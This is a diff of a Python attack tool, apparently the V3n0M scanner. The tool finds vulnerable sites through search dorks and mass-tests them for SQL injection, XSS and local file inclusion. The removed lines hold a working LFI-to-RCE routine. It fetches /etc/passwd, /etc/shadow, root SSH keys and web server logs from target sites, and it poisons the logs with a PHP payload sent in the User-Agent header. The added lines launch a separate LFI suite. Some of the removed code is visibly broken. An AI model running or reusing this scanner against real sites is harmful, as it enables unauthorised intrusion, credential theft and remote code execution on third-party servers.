@@ -87,7 +87,7 @@ __name__ = '__main__'
 def logo():
     cache_Check()
     print(R + "\n|----------------------------------------------------------------|")
-    print("| Release Date August 8th 2017 " + B + "         Author: NovaCygni       " + R + " |")
+    print("| Release Date Sept 11th 2017   " + B + "        Author: NovaCygni       " + R + " |")
     print("|        Proxy Enabled " + G + " [", ProxyEnabled, "] " + R + "                               |")
     print("|        Cache & Log Status " + B + " [", cachestatus, "] " + R + "           |")
     print("| " + O +"Features:" + "SQli-Dorker DNS-Bruteforcer AdminPage-Finder " + R + "         |")
@@ -130,27 +130,7 @@ class Injthread(threading.Thread):
         self.check = False
 
 
-class Lfithread(threading.Thread):
-    def __init__(self, hosts):
-        self.hosts = hosts
-        self.fcount = 0
-        self.check = True
-        threading.Thread.__init__(self)
 
-    def run(self):
-        urls = list(self.hosts)
-        for url in urls:
-            try:
-                if self.check:
-                    classiclfi(url)
-                else:
-                    break
-            except KeyboardInterrupt:
-                pass
-        self.fcount += 1
-
-    def stop(self):
-        self.check = False
 
 
 class xssthread(threading.Thread):
@@ -176,47 +156,6 @@ class xssthread(threading.Thread):
         self.check = False
 
 
-## NEEDS FIXING ##
-# noinspection PyBroadException
-def classiclfi(url):
-    lfiurl = url.rsplit('=', 1)[0]
-    if lfiurl[-1] != "=":
-        lfiurl += "="
-    for lfi in lfis:
-        try:
-            check = urllib.request.urlopen(lfiurl + lfi.replace("n", "")).read()
-            if re.findall("root:x", check):
-                print(R + "[LFI]: ", O + lfiurl + lfi, R + " ---> Local File Include Found")
-                lfi_log_file.write("n" + lfiurl + lfi)
-                vuln.append(lfiurl + lfi)
-                target = lfiurl + lfi
-                target = target.replace("/etc/passwd", "/proc/self/environ", "/etc/passwd%00",
-                                        "../../../../../etc/passwd%00",
-                                        "/etc/shadow", "/etc/issue", "/etc/group", "/etc/hostname",
-                                        "/etc/ssh/ssh_config",
-                                        "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
-                                        "/home/user/.ssh/authorized_keys",
-                                        "/home/user/.ssh/id_rsa", "/etc/apache2/apache2.conf",
-                                        "/usr/local/etc/apache2/httpd.conf"
-                                        , "/etc/httpd/conf/httpd.conf", "/var/log/apache2/access.log",
-                                        "/var/log/httpd-access.log",
-                                        "/var/log/httpd/access_log")
-                header = "<? echo md5(NovaCygni); ?>"
-                try:
-                    request_web = urllib.request.Request(target)
-                    request_web.add_header('User-Agent', header)
-                    request_web.add_header = [("connection", "keep-alive"), "Cookie"]
-                    text = urllib.request.urlopen(request_web)
-                    text = text.read()
-                    if re.findall("7ca328e93601c940f87d01df2bbd1972", text):
-                        print(R + "[LFI > RCE]: ", O + target, R + " ---> LFI to RCE Found")
-                        rce_log_file.write(target)
-                        vuln.append(target)
-                except:
-                    pass
-        except:
-            pass
-
 
 # noinspection PyBroadException
 def classicxss(url):
@@ -236,26 +175,6 @@ def classicxss(url):
                     sys.stdout.flush()
 
 
-# noinspection PyBroadException
-def lfitest():
-    print(B + "\n[+] Preparing for LFI - RCE scanning ...")
-    print("[+] Can take a while ...")
-    print("[!] Working ...\n")
-    vb = len(usearch) / int(numthreads)
-    i = int(vb)
-    m = len(usearch) % int(numthreads)
-    z = 0
-    if len(threads) <= int(numthreads):
-        for x in range(0, int(numthreads)):
-            sliced = usearch[x * i:(x + 1) * i]
-            if z < m:
-                sliced.append(usearch[int(numthreads) * i + z])
-                z += 1
-            thread = Lfithread(sliced)
-            thread.start()
-            threads.append(thread)
-        for thread in threads:
-            thread.join()
 
 
 # noinspection PyBroadException
@@ -747,7 +666,7 @@ def fscan():
     print("Dorks           :", len(loaded_Dorks))
     print("Pages           :", pages_pulled_as_one)
     print("Timeout         :", timeout)
-    time.sleep(4)
+    time.sleep(5)
     loop = asyncio.get_event_loop()
     usearch = loop.run_until_complete(search(pages_pulled_as_one))
     vulnscan()
@@ -801,7 +720,7 @@ def vulnscan():
     print(R + "\n[1] SQLi Testing, " + O + "Will verify the Vuln links and print the Injectable URL to the screen")
     print(
         R + "[2] SQLi Testing Auto Mode " + O + "Will attempt to Verify vuln sites then Column count if MySQL detected")
-    print(R + "[3] LFI - RCE Testing [!] Broken, Please Wait for fix [!]")
+    print(R + "[3] Launch LFI Suite")
     print(R + "[4] XSS Testing")
     print(R + "[5] Save valid Sorted and confirmed vuln urls to file")
     print(R + "[6] Print all the UNSORTED urls ")
@@ -824,11 +743,10 @@ def vulnscan():
         print()
     elif chce == '3':
         os.system('clear')
-        vuln = []
-        lfitest()
-        endsub = 0
-        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
-        print()
+        path = os.path.dirname(str(os.path.realpath(__file__)))
+        lfisuite = subprocess.Popen(path + "/lfisuite.py ", shell=True)
+        lfisuite.communicate()
+        subprocess._cleanup()
     elif chce == '4':
         os.system('clear')
         vuln = []
@@ -1102,8 +1020,9 @@ def fmenu():
             att = str("att")
         print(B)
         pwd = os.path.dirname(str(os.path.realpath(__file__)))
-        dnsbrute = subprocess.Popen(pwd + "/modules/dnsbrute.py -w lists/subdomains -u " + str(target_site) + " -t " + att
-                                    ,shell=True)
+        dnsbrute = subprocess.Popen(
+            pwd + "/modules/dnsbrute.py -w lists/subdomains -u " + str(target_site) + att + " -t 200"
+            , shell=True)
         dnsbrute.communicate()
         subprocess._cleanup()
 
@@ -1125,9 +1044,10 @@ def fmenu():
         os.system('clear')
         logo()
         print("[1] Skip to custom SQLi list checking")
-        print("[2] Print contents of Log files")
-        print("[3] Flush Cache and Delete Logs *Warning will erase Toxin Logs/Saves aswell* ")
-        print("[4] Perform forced update of ALL installed Python packages and dependancies on system")
+        print("[2] Launch LFI Suite")
+        print("[3] Print contents of Log files")
+        print("[4] Flush Cache and Delete Logs *Warning will erase Toxin Logs/Saves aswell* ")
+        print("[5] Perform forced update of ALL installed Python packages and dependancies on system")
         print("[0] Return to main menu")
         chce2 = input(":")
         if chce2 == '1':
@@ -1135,11 +1055,16 @@ def fmenu():
             customSelected = True
             injtest()
         elif chce2 == '2':
+            path = os.path.dirname(str(os.path.realpath(__file__)))
+            lfisuite = subprocess.Popen(path + "/lfisuite.py ", shell=True)
+            lfisuite.communicate()
+            subprocess._cleanup()
+        elif chce2 == '3':
             for filename in glob("*.txt"):
                 print(filename)
             print("Dumping output of Cache complete, Sleeping for 5 seconds")
             time.sleep(5)
-        elif chce2 == '3':
+        elif chce2 == '4':
             try:
                 print("Checking if Cache or Logs even exist!")
                 time.sleep(1)
@@ -1149,10 +1074,18 @@ def fmenu():
                     time.sleep(2)
             except Exception:
                 print("No Cache or Log Files to delete!")
-        elif chce2 == '4':
+        elif chce2 == '5':
             import pip
             from subprocess import call
             import time
+            path = os.path.dirname(str(os.path.realpath(__file__)))
+            print("Updating Python Module First: Cloudbuster files. Please wait.")
+            time.sleep(2)
+            cloudupdate = subprocess.Popen(path + "/lists/update.py ", shell=True)
+            cloudupdate.communicate()
+            subprocess._cleanup()
+            print("Cloudbuster features updated!, Moving onto Python Modules and Dependencies...")
+            time.sleep(4)
             sys.stdout.flush()
             print(
                 "This will install the missing modules and upgrade them to current versions then update your Python3 entirely")
@@ -1171,7 +1104,7 @@ def fmenu():
 d0rk = [line.strip() for line in open("lists/d0rks", 'r', encoding='utf-8')]
 header = [line.strip() for line in open("lists/header", 'r', encoding='utf-8')]
 xsses = [line.strip() for line in open("lists/xsses", 'r', encoding='utf-8')]
-lfis = [line.strip() for line in open("lists/lfi", 'r', encoding='utf-8')]
+lfis = [line.strip() for line in open("lists/pathtotest_huge.txt", 'r', encoding='utf-8')]
 tables = [line.strip() for line in open("lists/tables", 'r', encoding='utf-8')]
 columns = [line.strip() for line in open("lists/columns", 'r', encoding='utf-8')]
 search_Ignore = str(line.strip() for line in open("lists/search_ignore", 'r', encoding='utf-8'))
@@ -1277,7 +1210,7 @@ timeout = 7
 file = "/etc/passwd"
 ProxyEnabled = False
 menu = True
-current_version = str("418  ")
+current_version = str("419  ")
 while True:
     fmenu()
 
